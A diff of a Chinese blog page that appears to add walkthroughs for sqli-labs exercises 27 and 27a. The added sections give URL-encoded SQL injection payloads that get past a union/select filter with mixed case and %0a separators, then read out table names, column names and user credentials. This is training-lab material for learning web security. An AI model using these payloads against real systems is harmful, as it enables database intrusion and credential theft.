@@ -119,8 +119,13 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/89f93b9342f747f69a5058e8867bfe1e.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/06f45669a8364abf964416b56ef41162.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/a6eb67420a564aefa6b0db7a590746a8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/640894db3cb5432c989a7acd51f24692.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8e2536c496e34fcfb283f7ac2015f21a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/247acbaea0c54441a73a5ee026b5d0b4.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/46fc4b03d6a349afaaafa04306e89ff6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/890e590f23394b7eaafd575114781347.png">
 <meta property="article:published_time" content="2022-01-19T06:44:56.804Z">
-<meta property="article:modified_time" content="2022-01-22T16:18:51.465Z">
+<meta property="article:modified_time" content="2022-01-23T03:50:34.724Z">
 <meta property="article:author" content="quan9i">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
@@ -483,7 +488,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1k
+                  1.2k
                 </span>
               
 
@@ -552,7 +557,19 @@
 <h1><span id="sql-lab-27">sql -lab 27</span></h1><p>观察题目<br><img src="https://img-blog.csdnimg.cn/89f93b9342f747f69a5058e8867bfe1e.png" alt="在这里插入图片描述"><br>题目中说 union和select属于他，此时去观看源码<br><img src="https://img-blog.csdnimg.cn/06f45669a8364abf964416b56ef41162.png" alt="在这里插入图片描述"><br>大小写的union select都被注释掉了，想要使用union select的话，可以用一部分大写，一部分小写来绕过从而进行注入</p>
 <h2><span id="查询库名">查询库名</span></h2><p>构造payload</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%20UnioN%0aSeleCT%0a1,database(),3%0aor&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>执行结果<br><img src="https://img-blog.csdnimg.cn/a6eb67420a564aefa6b0db7a590746a8.png" alt="在这里插入图片描述"><br>]’’</p>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/a6eb67420a564aefa6b0db7a590746a8.png" alt="在这里插入图片描述"></p>
+<h2><span id="查询表名">查询表名</span></h2><p>构造payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">0</span>AUNion<span class="operator">%</span><span class="number">0</span>AsElEct<span class="operator">%</span><span class="number">0</span>A1,(<span class="keyword">SelEct</span><span class="operator">%</span><span class="number">0</span>agroup_concat(table_name)<span class="operator">%</span><span class="number">0</span>afrom<span class="operator">%</span><span class="number">0</span>ainformation_schema.tables<span class="operator">%</span><span class="number">0</span>awhere<span class="operator">%</span><span class="number">0</span>atable_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>),<span class="string">&#x27;3</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/640894db3cb5432c989a7acd51f24692.png" alt="在这里插入图片描述"></p>
+<h2><span id="查询列名">查询列名</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">0</span>AUNion<span class="operator">%</span><span class="number">0</span>AsElEct<span class="operator">%</span><span class="number">0</span>A1,(<span class="keyword">SelEct</span><span class="operator">%</span><span class="number">0</span>agroup_concat(column_name)<span class="operator">%</span><span class="number">0</span>afrom<span class="operator">%</span><span class="number">0</span>ainformation_schema.columns<span class="operator">%</span><span class="number">0</span>awhere<span class="operator">%</span><span class="number">0</span>atable_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="string">&#x27;3</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/8e2536c496e34fcfb283f7ac2015f21a.png" alt="在这里插入图片描述"></p>
+<h2><span id="查询字段信息">查询字段信息</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">0</span>AUNion<span class="operator">%</span><span class="number">0</span>AsElEct<span class="operator">%</span><span class="number">0</span>A1,(<span class="keyword">SelEct</span><span class="operator">%</span><span class="number">0</span>agroup_concat(concat_ws(<span class="number">0x7e</span>,username,password))<span class="operator">%</span><span class="number">0</span>afrom<span class="operator">%</span><span class="number">0</span>asecurity.users),<span class="string">&#x27;3</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/247acbaea0c54441a73a5ee026b5d0b4.png" alt="在这里插入图片描述"></p>
+<h1><span id="sql-lab-27a">sql-lab 27a</span></h1><h2><span id="查询数据库">查询数据库</span></h2><p>构造payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span>&quot;%0AUNion%0AsElEct%0A1,database(),&quot;<span class="number">3</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/46fc4b03d6a349afaaafa04306e89ff6.png" alt="在这里插入图片描述"></p>
+<h2><span id="查询表名">查询表名</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">0</span>&quot;%0AUNion%0AsElEct%0A1,(SelEct%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;security&#x27;),&quot;<span class="number">3</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/890e590f23394b7eaafd575114781347.png" alt="在这里插入图片描述"></p>
 
       
     </div>
@@ -850,7 +867,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">sql-lab 23</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">sql-lab 24</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">sql-lab 25</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">sql -lab 25a</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text">sql -lab 26</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.1.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.2.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.3.</span> <span class="nav-text">查询字段信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">6.</span> <span class="nav-text">sql-lab 26a</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">7.</span> <span class="nav-text">sql -lab 27</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.1.</span> <span class="nav-text">查询库名</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">sql-lab 23</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">sql-lab 24</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">sql-lab 25</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">sql -lab 25a</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text">sql -lab 26</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.1.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.2.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.3.</span> <span class="nav-text">查询字段信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">6.</span> <span class="nav-text">sql-lab 26a</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">7.</span> <span class="nav-text">sql -lab 27</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.1.</span> <span class="nav-text">查询库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.2.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.3.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">7.4.</span> <span class="nav-text">查询字段信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">8.</span> <span class="nav-text">sql-lab 27a</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">8.1.</span> <span class="nav-text">查询数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">8.2.</span> <span class="nav-text">查询表名</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -934,7 +951,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">28.6k</span>
+    <span title="Site words total count">28.7k</span>
   
 </div>
 
